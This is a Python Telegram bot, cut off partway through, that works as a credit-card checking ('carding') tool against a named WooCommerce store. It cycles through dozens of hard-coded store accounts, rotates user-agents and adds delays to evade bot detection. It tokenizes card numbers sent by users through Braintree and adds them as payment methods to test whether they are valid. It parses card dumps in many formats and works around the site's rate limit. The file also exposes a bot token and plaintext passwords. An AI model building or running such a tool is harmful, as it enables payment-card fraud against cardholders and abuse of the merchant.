#!/usr/bin/env python3
"""
Telegram Bot Integrated with WooCommerce flow for my site
"""

import aiohttp
import json
import re
import base64
import time
import asyncio
import csv
import random
from bs4 import BeautifulSoup
from urllib.parse import urlencode
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputMediaVideo
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from telegram.constants import ParseMode

# Bot token
TOKEN = "8361809176:AAH1f6N--sTzQd3Y8aMaqXJ1DVQMfns_Sbs"

# List of accounts for load balancing
ACCOUNTS = [
    {'username': 'pap0001@gmail.com', 'password': '#Moha254$$'},
    {'username': 'moha1@gmail.com', 'password': '#Moha254$$'},
    {'username': 'moha2@gmail.com', 'password': '#Moha254$$'},
    {'username': 'moha3@gmail.com', 'password': '#Moha254$$'},
    {'username': 'moha4@gmail.com', 'password': '#Moha254$$'},
    {'username': 'amkush9@gmail.com', 'password': '#Moha254$$'},
    {'username': 'amkush10@gmail.com', 'password': '#Moha254$$'},
    {'username': 'amkush7@gmail.com', 'password': '#Moha254$$'},
    {'username': 'amkush8@gmail.com', 'password': '#Moha254$$'},
    {'username': 'amkush5@gmail.com', 'password': '#Moha254$$'},
    {'username': 'amkush6@gmail.com', 'password': '#Moha254$$'},
    {'username': 'amkush3@gmail.com', 'password': '#Moha254$$'},
    {'username': 'amkush4@gmail.com', 'password': '#Moha254$$'},
    {'username': 'amkush2@gmail.com', 'password': '#Moha254$$'},
    {'username': 'amkush1@gmail.com', 'password': '#Moha254$$'},
    {'username': 'lolo1@gmail.com', 'password': '#Moha254$$'},
    {'username': 'lolo2@gmail.com', 'password': '#Moha254$$'},
    {'username': 'lolo3@gmail.com', 'password': '#Moha254$$'},
    {'username': 'lolo4@gmail.com', 'password': '#Moha254$$'},
    {'username': 'meme899001@gmail.com', 'password': '#Moha254$$'},
    {'username': 'kos67ka002@gmail.com', 'password': '#Moha254$$'},
    {'username': 'Moha254@gmail.com', 'password': '#Moha254$$'},
    {'username': 'koska002@gmail.com', 'password': '#Moha254$$'},
    {'username': 'meme899@gmail.com', 'password': '#Moha254$$'},
    {'username': 'koska001@gmail.com', 'password': '#Moha254$$'},
    {'username': 'popo9090@gmail.com', 'password': '#Moha254$$'},
    {'username': 'koska00@gmail.com', 'password': '#Moha254$$'},
    {'username': 'koska0@gmail.com', 'password': '#Moha254$$'},
    {'username': 'mokapa@gmail.com', 'password': '#Moha254$$'},
    {'username': 'amkushu98799@gmail.com', 'password': '#Moha254$$'},
    {'username': 'opakauy@gmail.com', 'password': '#Moha254$$'},
    {'username': 'yata454@gmail.com', 'password': '#Moha254$$'},
    {'username': 'poka3543@gmail.com', 'password': '#Moha254$$'},
    {'username': 'meme899@gmail.com', 'password': '#Moha254$$'},
    {'username': 'popo09@gmail.com', 'password': '#Moha254$$'},
    {'username': 'kona9099@gmail.com', 'password': '#Moha254$$'},
    {'username': 'popalako09@gmail.com', 'password': '#Moha254$$'},
    {'username': 'rostabb@gmail.com', 'password': '#Moha254$$'},
    {'username': 'Mrrobotx99@gmail.com', 'password': '#Moha254$$'},
    {'username': 'polu60@gmail.com', 'password': '#Moha254$$'},
    {'username': 'meandyou@gmail.com', 'password': '#Moha254$$'},
]

# List of user-agents for rotation
USER_AGENTS = [
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
]

# Global counter for round-robin account selection
ACCOUNT_INDEX = 0

# Lock for thread-safe account selection
ACCOUNT_LOCK = asyncio.Lock()

# Load BIN data from CSV
BIN_DATA = {}
try:
    with open('bins_all.csv', 'r') as f:
        reader = csv.DictReader(f)
        for row in reader:
            BIN_DATA[row['number']] = row
except FileNotFoundError:
    print("Warning: bins_all.csv not found. BIN lookup will not work.")

class PaymentFlowAutomator:
    def __init__(self):
        # Common headers for all requests
        self.base_headers = {
            'authority': 'precisionpowdertx.com',
            'accept-language': 'en-ZA,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'connection': 'keep-alive',
        }

    def log(self, message, level="INFO"):
        """Enhanced logging with timestamps"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"[{timestamp}] [{level}] {message}")

    async def login(self, session, account, max_retries=5):
        """Perform login to acquire fresh session cookies with retry logic"""
        self.log(f"🔑 Logging in with {account['username']} to acquire fresh session cookies...")
        login_url = 'https://precisionpowdertx.com/my-account/'

        for attempt in range(1, max_retries + 1):
            try:
                # Random delay to avoid bot detection
                await asyncio.sleep(random.uniform(5, 10))

                # Rotate user-agent
                headers = {
                    **self.base_headers,
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'cache-control': 'no-cache',
                    'referer': 'https://precisionpowdertx.com/my-account/',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': random.choice(USER_AGENTS),
                }
                async with session.get(login_url, headers=headers, timeout=120) as response:
                    response.raise_for_status()
                    text = await response.text()
                    soup = BeautifulSoup(text, 'html.parser')

                    # Primary nonce extraction
                    nonce_input = soup.find('input', {'name': 'woocommerce-login-nonce'})
                    if nonce_input and nonce_input.get('value'):
                        login_nonce = nonce_input['value']
                        self.log(f"   ✓ Login nonce extracted: {login_nonce}")
                    else:
                        # Fallback: Try alternative nonce patterns
                        alternative_nonces = (
                            soup.find_all('input', {'name': re.compile(r'.*nonce.*|.*security.*', re.I)}) +
                            soup.find_all('input', {'id': re.compile(r'.*nonce.*|.*security.*', re.I)})
                        )
                        for input_elem in alternative_nonces:
                            name = input_elem.get('name') or input_elem.get('id')
                            value = input_elem.get('value')
                            if name and value:
                                login_nonce = value
                                self.log(f"   ✓ Alternative nonce extracted from {name}: {login_nonce}")
                                break
                        else:
                            # Log a snippet of the HTML for debugging
                            html_snippet = text[:500] + ('...' if len(text) > 500 else '')
                            self.log(f"   ⚠️ No nonce found. HTML snippet: {html_snippet}", "WARN")
                            raise Exception("Failed to find login nonce")

                # Step 2: POST the login form
                login_data = {
                    'username': account['username'],
                    'password': account['password'],
                    'rememberme': 'forever',
                    'woocommerce-login-nonce': login_nonce,
                    '_wp_http_referer': '/my-account/',
                    'login': 'Log in'
                }
                headers = {
                    **self.base_headers,
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'cache-control': 'no-cache',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://precisionpowdertx.com',
                    'referer': 'https://precisionpowdertx.com/my-account/',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': random.choice(USER_AGENTS),
                }
                async with session.post(login_url, data=login_data, headers=headers, timeout=120, allow_redirects=True) as response:
                    response.raise_for_status()
                    text = await response.text()
                    if 'woocommerce-error' in text:
                        soup = BeautifulSoup(text, 'html.parser')
                        error = soup.find('ul', {'class': 'woocommerce-error'})
                        error_message = error.find('li').text.strip() if error else "Unknown login error"
                        raise Exception(f"Login failed for {account['username']}: {error_message}")
                    self.log(f"   ✓ Login successful for {account['username']}—fresh cookies acquired in session")
                    return

            except (aiohttp.ClientConnectionError, aiohttp.ClientResponseError) as e:
                self.log(f"   ⚠️ Login attempt {attempt} failed for {account['username']}: {str(e)}", "WARN")
                if attempt < max_retries:
                    self.log(f"   ⏳ Retrying in 15 seconds...")
                    await asyncio.sleep(15)
                else:
                    self.log(f"   ❌ Max login retries reached for {account['username']}", "ERROR")
                    raise Exception(f"Login failed after {max_retries} attempts: {str(e)}")
            except Exception as e:
                self.log(f"   ❌ Login failed for {account['username']}: {str(e)}", "ERROR")
                raise

    async def extract_nonces(self, session, url='https://precisionpowdertx.com/my-account/add-payment-method/'):
        """
        Step 1: Extract fresh nonces from HTML page
        Returns a dictionary of all discovered nonces
        """
        self.log("🔍 Step 1: Extracting nonces from HTML...")
        
        headers = {
            **self.base_headers,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'cache-control': 'max-age=0',
            'referer': 'https://precisionpowdertx.com/my-account/add-payment-method/',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': random.choice(USER_AGENTS),
        }
        
        try:
            async with session.get(url, headers=headers, timeout=120) as response:
                response.raise_for_status()
                text = await response.text()
                
                soup = BeautifulSoup(text, 'html.parser')
                nonces = {}
                
                # Extract nonce from IP_LOCATION_BLOCK_AUTH JavaScript variable
                ip_block_match = re.search(r'IP_LOCATION_BLOCK_AUTH\s*=\s*{[^}]*"nonce"\s*:\s*"([^"]+)"', text)
                if ip_block_match:
                    nonces['ip_location_block_auth'] = ip_block_match.group(1)
                    self.log(f"   ✓ IP Location Block Auth nonce: {ip_block_match.group(1)}")
                
                # Extract WooCommerce payment method nonce
                wc_nonce_input = soup.find('input', {'name': 'woocommerce-add-payment-method-nonce'})
                if wc_nonce_input and wc_nonce_input.get('value'):
                    nonces['woocommerce_payment_method'] = wc_nonce_input['value']
                    self.log(f"   ✓ WooCommerce payment method nonce: {wc_nonce_input['value']}")
                
                # Extract Braintree client token nonce from JavaScript
                client_token_match = re.search(r'"client_token_nonce"\s*:\s*"([^"]+)"', text)
                if client_token_match:
                    nonces['client_token_nonce'] = client_token_match.group(1)
                    self.log(f"   ✓ Braintree client token nonce: {client_token_match.group(1)}")
                
                # Extract AJAX security nonce for logging
                ajax_security_match = re.search(r'security\s*:\s*[\'"]([^\'\"]+)[\'"]', text)
                if ajax_security_match:
                    nonces['ajax_security'] = ajax_security_match.group(1)
                    self.log(f"   ✓ AJAX security nonce: {ajax_security_match.group(1)}")
                
                # Extract any other nonce-like inputs
                nonce_inputs = soup.find_all('input', {'name': re.compile(r'.*nonce.*|.*security.*', re.I)})
                for input_elem in nonce_inputs:
                    name = input_elem.get('name')
                    value = input_elem.get('value')
                    if name and value and name not in ['woocommerce-add-payment-method-nonce']:
                        nonces[name] = value
                        self.log(f"   ✓ Additional nonce {name}: {value}")
                
                # Check for errors in initial page
                error = soup.find('ul', {'class': 'woocommerce-error'})
                if error:
                    error_message = error.find('li').text.strip()
                    nonces['initial_error'] = error_message
                    self.log(f"   ⚠️ Initial page error: {error_message}", "WARN")
                
                self.log(f"   📊 Total nonces extracted: {len(nonces)}")
                return nonces
                
        except Exception as e:
            self.log(f"   ❌ Failed to extract nonces: {str(e)}", "ERROR")
            raise

    async def get_client_token(self, session, nonces):
        """
        Step 2: Generate Braintree client token using extracted nonces
        Returns the Bearer token for credit card tokenization
        """
        self.log("🔑 Step 2: Generating Braintree client token...")
        
        headers = {
            **self.base_headers,
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://precisionpowdertx.com',
            'referer': 'https://precisionpowdertx.com/my-account/add-payment-method/',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'x-requested-with': 'XMLHttpRequest',
            'user-agent': random.choice(USER_AGENTS),
        }
        
        data = {
            'action': 'wc_braintree_credit_card_get_client_token',
            'nonce': nonces.get('client_token_nonce', ''),
            '': nonces.get('ip_location_block_auth', '')
        }
        
        try:
            async with session.post(
                'https://precisionpowdertx.com/wp-admin/admin-ajax.php',
                headers=headers,
                data=data,
                timeout=120
            ) as response:
                response.raise_for_status()
                result = await response.json()
                
                if result.get('success') and result.get('data'):
                    client_token = result['data']
                    self.log(f"   ✓ Client token generated successfully")
                    self.log(f"   🔍 Token preview: {client_token[:50]}...")
                    return client_token
                else:
                    raise Exception(f"Failed to get client token: {result}")
                    
        except Exception as e:
            self.log(f"   ❌ Failed to generate client token: {str(e)}", "ERROR")
            raise

    async def tokenize_credit_card(self, session, client_token, card_data):
        """
        Step 3: Tokenize credit card using Braintree GraphQL API
        Returns the payment token for final submission
        """
        self.log("💳 Step 3: Tokenizing credit card via Braintree API...")
        
        try:
            token_data = json.loads(base64.b64decode(client_token).decode('utf-8'))
            authorization_fingerprint = token_data['authorizationFingerprint']
            config_url = token_data['configUrl']
            
            self.log(f"   🔍 Using Braintree API URL: {config_url}")
            
            headers = {
                'authority': 'payments.braintree-api.com',
                'accept': '*/*',
                'accept-language': 'en-ZA,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                'authorization': f'Bearer {authorization_fingerprint}',
                'braintree-version': '2018-05-10',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'referer': 'https://assets.braintreegateway.com/',
                'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': random.choice(USER_AGENTS),
            }
            
            json_data = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'custom',
                    'sessionId': f'session_{int(time.time() * 1000)}'
                },
                'query': '''mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
                    tokenizeCreditCard(input: $input) {
                        token
                        creditCard {
                            bin
                            brandCode
                            last4
                            cardholderName
                            expirationMonth
                            expirationYear
                            binData {
                                prepaid
                                healthcare
                                debit
                                durbinRegulated
                                commercial
                                payroll
                                issuingBank
                                countryOfIssuance
                                productId
                            }
                        }
                    }
                }''',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': card_data['number'].replace(' ', ''),
                            'expirationMonth': card_data['expiry_month'],
                            'expirationYear': card_data['expiry_year'],
                            'cvv': card_data['cvv']
                        },
                        'options': {
                            'validate': False
                        }
                    }
                },
                'operationName': 'TokenizeCreditCard'
            }
            
            async with session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data, timeout=120) as response:
                response.raise_for_status()
                result = await response.json()
                
                if result.get('data') and result['data'].get('tokenizeCreditCard'):
                    token_info = result['data']['tokenizeCreditCard']
                    payment_token = token_info['token']
                    card_info = token_info.get('creditCard', {})
                    
                    self.log(f"   ✓ Credit card tokenized successfully")
                    self.log(f"   💳 Payment token: {payment_token}")
                    self.log(f"   🏦 Card brand: {card_info.get('brandCode', 'N/A')}")
                    self.log(f"   🔢 Last 4 digits: {card_info.get('last4', 'N/A')}")
                    
                    return payment_token, card_info
                else:
                    raise Exception(f"Failed to tokenize credit card: {result}")
                    
        except Exception as e:
            self.log(f"   ❌ Failed to tokenize credit card: {str(e)}", "ERROR")
            raise

    async def submit_payment_method(self, session, payment_token, nonces, card_data):
        """
        Step 4: Submit payment method to WooCommerce and check for errors with subsequent GET
        Returns the final response with error checking
        """
        self.log("🚀 Step 4: Submitting payment method to WooCommerce...")
        
        headers = {
            **self.base_headers,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://precisionpowdertx.com',
            'referer': 'https://precisionpowdertx.com/my-account/add-payment-method/',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': random.choice(USER_AGENTS),
        }
        
        form_data = {
            'payment_method': 'braintree_credit_card',
            'wc-braintree-credit-card-card-type': card_data.get('card_type', 'master-card'),
            'wc-braintree-credit-card-3d-secure-enabled': '',
            'wc-braintree-credit-card-3d-secure-verified': '',
            'wc-braintree-credit-card-3d-secure-order-total': card_data.get('amount', '1.08'),
            'wc_braintree_credit_card_payment_nonce': payment_token,
            'wc_braintree_device_data': '',
            'wc-braintree-credit-card-tokenize-payment-method': 'true',
            'woocommerce-add-payment-method-nonce': nonces.get('woocommerce_payment_method', ''),
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }
        
        try:
            # Step 4.1: Submit POST request
            start_time = time.time()
            async with session.post(
                'https://precisionpowdertx.com/my-account/add-payment-method/',
                headers=headers,
                data=form_data,
                timeout=120,
                allow_redirects=False
            ) as response:
                response_time = (time.time() - start_time) * 1000
                text = await response.text()
                
                final_response = {
                    'status_code': response.status,
                    'status_text': response.reason,
                    'headers': dict(response.headers),
                    'content_length': len(text),
                    'response_time_ms': response_time,
                    'timestamp': datetime.now().isoformat(),
                    'success': response.status < 400,
                    'cookies': dict(response.cookies),
                    'request_data': form_data
                }
                
                # Parse POST response for errors
                soup = BeautifulSoup(text, 'html.parser')
                error = soup.find('ul', {'class': 'woocommerce-error'})
                if error:
                    error_message = error.find('li').text.strip()
                    final_response['error_messages'] = [error_message]
                    self.log(f"   ⚠️ POST response error: {error_message}", "WARN")
                
                # Check for JSON response
                try:
                    json_data = json.loads(text)
                    if json_data.get('result') == 'failure':
                        final_response['error_messages'] = final_response.get('error_messages', []) + [json_data.get('messages', 'Unknown error')]
                        self.log(f"   ⚠️ JSON error: {json_data.get('messages')}", "WARN")
                    elif json_data.get('result') == 'success':
                        final_response['success_messages'] = ['Payment method added successfully']
                        self.log(f"   🎉 Payment method added successfully!")
                except ValueError:
                    pass  # Response is not JSON
                
                # Step 4.2: Subsequent GET to check for errors
                self.log("🔍 Step 4.2: Performing subsequent GET to check for errors...")
                await asyncio.sleep(1)  # Avoid rate limiting
                async with session.get(
                    'https://precisionpowdertx.com/my-account/add-payment-method/',
                    headers=headers,
                    timeout=120
                ) as get_response:
                    get_response_time = (time.time() - start_time) * 1000
                    get_text = await get_response.text()
                    
                    final_response['subsequent_get'] = {
                        'status_code': get_response.status,
                        'status_text': get_response.reason,
                        'response_time_ms': get_response_time,
                        'timestamp': datetime.now().isoformat(),
                        'content_length': len(get_text)
                    }
                    
                    # Parse subsequent GET response for errors
                    soup = BeautifulSoup(get_text, 'html.parser')
                    error = soup.find('ul', {'class': 'woocommerce-error'})
                    if error:
                        error_message = error.find('li').text.strip()
                        final_response['error_messages'] = final_response.get('error_messages', []) + [error_message]
                        self.log(f"   ⚠️ Subsequent GET error: {error_message}", "WARN")
                    
                    # Log results
                    self.log(f"   ✓ Payment submission completed")
                    self.log(f"   📊 POST Status: {final_response['status_code']} {final_response['status_text']}")
                    self.log(f"   📊 Subsequent GET Status: {final_response['subsequent_get']['status_code']} {final_response['subsequent_get']['status_text']}")
                    self.log(f"   ⏱️ POST Response time: {final_response['response_time_ms']:.2f}ms")
                    self.log(f"   ⏱️ GET Response time: {final_response['subsequent_get']['response_time_ms']:.2f}ms")
                    
                    return final_response
                    
        except Exception as e:
            self.log(f"   ❌ Failed to submit payment method or perform subsequent GET: {str(e)}", "ERROR")
            raise

    async def run_full_flow(self, card_data, user_id, context, max_retries=5):
        """
        Execute the complete payment flow automation with retry logic
        """
        global ACCOUNT_INDEX
        # Select account in round-robin fashion with lock for concurrency
        async with ACCOUNT_LOCK:
            account = ACCOUNTS[ACCOUNT_INDEX % len(ACCOUNTS)]
            ACCOUNT_INDEX += 1
        
        self.log("="*60)
        self.log(f"🚀 Starting WooCommerce Payment Flow Automation for user {user_id} with account {account['username']}")
        self.log("="*60)
        
        start_time = time.time()
        
        async with aiohttp.ClientSession() as session:
            # Perform login to get fresh cookies
            try:
                await self.login(session, account)
            except Exception as e:
                self.log(f"❌ Login failed for {account['username']}: {str(e)}", "ERROR")
                return {
                    'success': False,
                    'error': f"Login failed: {str(e)}",
                    'execution_time_seconds': time.time() - start_time,
                    'timestamp': datetime.now().isoformat(),
                    'attempts': 0
                }
            
            for attempt in range(1, max_retries + 1):
                try:
                    self.log(f"🔄 Attempt {attempt} of {max_retries}")
                    
                    # Step 1: Extract fresh nonces
                    nonces = await self.extract_nonces(session)
                    if nonces.get('initial_error'):
                        raise Exception(f"Initial page error: {nonces['initial_error']}")
                    
                    # Step 2: Get client token
                    client_token = await self.get_client_token(session, nonces)
                    
                    # Step 3: Tokenize credit card
                    payment_token, card_info = await self.tokenize_credit_card(session, client_token, card_data)
                    
                    # Step 4: Submit payment method and check errors
                    final_response = await self.submit_payment_method(session, payment_token, nonces, card_data)
                    
                    # Check for the specific error that requires retry
                    error_messages = final_response.get('error_messages', [])
                    retry_error = "You cannot add a new payment method so soon after the previous one. Please wait for 20 seconds"
                    
                    if any(retry_error in msg for msg in error_messages):
                        if attempt < max_retries:
                            self.log(f"⚠️ Retry required: {retry_error}")
                            self.log(f"⏳ Waiting 25 seconds before retry...")
                            await asyncio.sleep(25)  # Wait 25 seconds before retry
                            continue
                        else:
                            self.log(f"❌ Max retries reached, showing error")
                    
                    # Calculate total execution time
                    execution_time = time.time() - start_time
                    
                    self.log("="*60)
                    self.log("🎯 PAYMENT FLOW COMPLETED!")
                    self.log(f"⏱️ Total execution time: {execution_time:.2f} seconds")
                    self.log("="*60)
                    
                    return {
                        'success': final_response.get('success', False),
                        'execution_time_seconds': execution_time,
                        'nonces_extracted': nonces,
                        'client_token_generated': bool(client_token),
                        'payment_token': payment_token,
                        'card_info': card_info,
                        'final_response': final_response,
                        'timestamp': datetime.now().isoformat(),
                        'attempts': attempt
                    }
                    
                except Exception as e:
                    execution_time = time.time() - start_time
                    if attempt == max_retries:
                        self.log("="*60)
                        self.log(f"❌ PAYMENT FLOW FAILED: {str(e)}", "ERROR")
                        self.log(f"⏱️ Execution time before failure: {execution_time:.2f} seconds")
                        self.log("="*60)
                        
                        return {
                            'success': False,
                            'error': str(e),
                            'execution_time_seconds': execution_time,
                            'timestamp': datetime.now().isoformat(),
                            'attempts': attempt
                        }
                    else:
                        self.log(f"⚠️ Attempt {attempt} failed: {str(e)}")
                        self.log(f"⏳ Waiting 5 seconds before retry...")
                        await asyncio.sleep(5)  # Wait 5 seconds before next retry

def extract_card_details(text):
    """
    Extract card details from text in various formats
    """
    patterns = [
        r'(\d{16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        r'(\d{15})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{3})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        r'(\d{16})[\s\|]+(\d{1,2})[\s\|]+(\d{2,4})[\s\|]+(\d{3,4})',
        r'(\d{15})[\s\|]+(\d{1,2})[\s\|]+(\d{2,4})[\s\|]+(\d{3,4})',
        r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4})[\s\|]+(\d{1,2})[\s\|]+(\d{2,4})[\s\|]+(\d{3,4})',
        r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{3})[\s\|]+(\d{1,2})[\s\|]+(\d{2,4})[\s\|]+(\d{3,4})',
        r'(\d{16})[:\|](\d{1,2})[:\|](\d{2,4})[:\|](\d{3,4})',
        r'(\d{15})[:\|](\d{1,2})[:\|](\d{2,4})[:\|](\d{3,4})',
        r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4})[:\|](\d{1,2})[:\|](\d{2,4})[:\|](\d{3,4})',
        r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{3})[:\|](\d{1,2})[:\|](\d{2,4})[:\|](\d{3,4})',
        r'(\d{16})[/](\d{1,2})[/](\d{2,4})[/](\d{3,4})',
        r'(\d{15})[/](\d{1,2})[/](\d{2,4})[/](\d{3,4})',
        r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4})[/](\d{1,2})[/](\d{2,4})[/](\d{3,4})',
        r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{3})[/](\d{1,2})[/](\d{2,4})[/](\d{3,4})',
        r'(\d{16})[:\|/](\d{1,2})[:\|/](\d{2,4})[:\|/](\d{3,4})',
        r'(\d{15})[:\|/](\d{1,2})[:\|/](\d{2,4})[:\|/](\d{3,4})',
        r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4})[:\|/](\d{1,2})[:\|/](\d{2,4})[:\|/](\d{3,4})',
        r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{3})[:\|/](\d{1,2})[:\|/](\d{2,4})[:\|/](\d{3,4})',
        r'(\d{16})[\s\|/]+(\d{1,2})[\s\|/]+(\d{2,4})[\s\|/]+(\d{3,4})',
        r'(\d{15})[\s\|/]+(\d{1,2})[\s\|/]+(\d{2,4})[\s\|/]+(\d{3,4})',
        r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4})[\s\|/]+(\d{1,2})[\s\|/]+(\d{2,4})[\s\|/]+(\d{3,4})',
        r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{3})[\s\|/]+(\d{1,2})[\s\|/]+(\d{2,4})[\s\|/]+(\d{3,4})',
        r'(\d{16})[;\|](\d{1,2})[;\|](\d{2,4})[;\|](\d{3,4})',
        r'(\d{15})[;\|](\d{1,2})[;\|](\d{2,4})[;\|](\d{3,4})',
        r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4})[;\|](\d{1,2})[;\|](\d{2,4})[;\|](\d{3,4})',
        r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{3})[;\|](\d{1,2})[;\|](\d{2,4})[;\|](\d{3,4})',
        r'(\d{16})[;\|/](\d{1,2})[;\|/](\d{2,4})[;\|/](\d{3,4})',
        r'(\d{15})[;\|/](\d{1,2})[;\|/](\d{2,4})[;\|/](\d{3,4})',
        r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4})[;\|/](\d{1,2})[;\|/](\d{2,4})[;\|/](\d{3,4})',
        r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{3})[;\|/](\d{1,2})[;\|/](\d{2,4})[;\|/](\d{3,4})',
        r'(\d{16})[\s;\|/]+(\d{1,2})[\s;\|/]+(\d{2,4})[\s;\|/]+(\d{3,4})',
        r'(\d{15})[\s;\|/]+(\d{1,2})[\s;\|/]+(\d{2,4})[\s;\|/]+(\d{3,4})',
        r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4})[\s;\|/]+(\d{1,2})[\s;\|/]+(\d{2,4})[\s;\|/]+(\d{3,4})',
        r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{3})[\s;\|/]+(\d{1,2})[\s;\|/]+(\d{2,4})[\s;\|/]+(\d{3,4})',
        r'(\d{16})[,\|](\d{1,2})[,\|](\d{2,4})[,\|](\d{3,4})',
        r'(\d{15})[,\|](\d{1,2})[,\|](\d{2,4})[,\|](\d{3,4})',
        r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4})[,\|](\d{1,2})[,\|](\d{2,4})[,\|](\d{3,4})',
        r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{3})[,\|](\d{1,2})[,\|](\d{2,4})[,\|](\d{3,4})',
        r'(\d{16})[,\|/](\d{1,2})[,\|/](\d{2,4})[,\|/](\d{3,4})',
        r'(\d{15})[,\|/](\d{1,2})[,\|/](\d{2,4})[,\|/](\d{3,4})',
        r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4})[,\|/](\d{1,2})[,\|/](\d{2,4})[,\|/](\d{3,4})',
        r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{3})[,\|/](\d{1,2})[,\|/](\d{2,4})[,\|/](\d{3,4})',
        r'(\d{16})[\s,\|/]+(\d{1,2})[\s,\|/]+(\d{2,4})[\s,\|/]+(\d{3,4})',
        r'(\d{15})[\s,\|/]+(\d{1,2})[\s,\|/]+(\d{2,4})[\s,\|/]+(\d{3,4})',
        r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4})[\s,\|/]+(\d{1,2})[\s,\|/]+(\d{2,4})[\s,\|/]+(\d{3,4})',
        r'(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{3})[\s,\|/]+(\d{1,2})[\s,\|/]+(\d{2,4})[\s,\|/]+(\d{3,4})',
        # Additional regex patterns
        r'(\d{16})[|;:,\s]+(\d{1,2})/(\d{2,4})[|;:,\s]+(\d{3,4})',  # e.g., 5598880214394241|06/2026|928
        r'(\d{15})[|;:,\s]+(\d{1,2})/(\d{2,4})[|;:,\s]+(\d{3,4})',
